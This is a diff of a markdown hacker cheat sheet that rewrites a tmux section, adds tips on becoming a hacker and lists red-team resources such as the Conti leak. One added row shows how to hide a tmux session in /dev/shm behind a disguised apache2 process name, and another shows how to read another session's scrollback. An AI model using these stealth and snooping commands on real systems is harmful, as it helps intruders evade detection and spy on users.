 1. https://github.com/ibraheemdev/modern-unix
 
 <a id="tmux"></a>
-**12.iii. tmux**
+**13.iii. Tmux Cheat Sheet**
+
 
 | | Tmux Cheat Sheet |
 | --- | --- |
-| Save Scrollback | ```Ctrl+b``` + ```:```, then type ```capture-pane -S -``` followed by ```Ctrl+b``` + ```:``` and type ```save-buffer filename.txt```. |
-| Attach | Start a new tmux, then type ```Ctrl+b``` + ```s``` and use ```LEFT```, ```RIGHT``` to expand and select any session. |
-| Logging | ```Ctrl+b``` + ```Shift + P``` to start and stop. |
-| Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |
+| Max Buffer | `Ctrl-b` + `:` + `set-option -g history-limit 65535` |
+| SaveScrollback | `Ctrl-b` + `:` + `capture-pane -S -` followed by `Ctrl-b` + `:` + `save-buffer filename.txt`. |
+| SpyScrollback | `tmux capture-pane -e -pS- -t 6.0` to capture pane 6, window 0 of a running tmux. Remove `-e` to save without colour. |
+| Clear | `tmux send-keys -R C-l \; clear-history -t6.0` to clear screen and delete scrollback history. |
+| Logging | `Ctrl-b` + `:` + `bind-key P pipe-pane -o "exec cat >>$HOME/'tmux-#W-#S.log'" \; display-message 'Toggling ~/tmux-#W-#S.log'`<BR>Press `Ctrl-b` + `Shift + P` to start and stop. |
+| HiddenTmux | `cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache`<BR>To attach to your session do <BR>`cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache attach` |
+| Attach | Start a new tmux, then type `Ctrl-b` + `s` and use `LEFT`, `RIGHT` to preview and select any session. |
+| Menu | `Ctrl-b` + `>`. Then use `Ctrl-b` + `UP`, `DOWN`, `LEFT` or `RIGHT` to move between the panes. |
 
 <a id="useful-commands"></a>
-**12.iv. Useful commands**
+**13.iv. Useful commands**
 
 Use `lsof -Pni` or `netstat -putan` (or `ss -putan`) to list all Internet (_-tu_) connections.
 
@@ -1696,19 +2592,37 @@ Example for *SSH*:
 rlwrap --always-readline ssh user@host
 ```
 ---
-<a id="others"></a>
-## 13. Other Sites
+<a id="hacker"></a>
+## 14. How to become a hacker
 
+There are many ways but one is:
+
+1. Use Linux and get proficient with Bash. Learn all Linux commands.
+2. Learn how the Internet works. Install and configure some servers (via shell access).
+4. Understand System Architecture and how an OS works.
+4. Read every book. Ask yourself "why is it done this way and not the other way?".
+5. Read the top 10 articles of [Phrack](https://www.phrack.org). 
+6. Join a hacker-channel. Sign up to [TryHackMe](https://tryhackme.com/) or [HackTheBox](https://www.hackthebox.com/).
+7. Be playful.
+
+---
+<a id="others"></a>
+## 15. Other Sites
+
+1. [Phineas Fisher](https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/) - No nonsense. Direct. How we like it.
 1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
 2. [Guacamaya Hackback](https://www.youtube.com/watch?v=5vRIisM0Op4)
 3. [Vx Underground](https://www.vx-underground.org/)
 4. [HTB absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html) - Well written and explained attack.
 5. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
 6. [Red Team Notes](https://www.ired.team/)
-7. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
-8. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
-9. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
-10. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)
+7. [InfoSec CheatSheet](https://github.com/r1cksec/cheatsheets)
+8. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
+9. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
+10. [Hacking Resources]https://github.com/vitalysim/Awesome-Hacking-Resources)
+10. [Awesome Hacking](https://github.com/Hack-with-Github/Awesome-Hacking)
+11. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
+12. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)
 
 
 ---
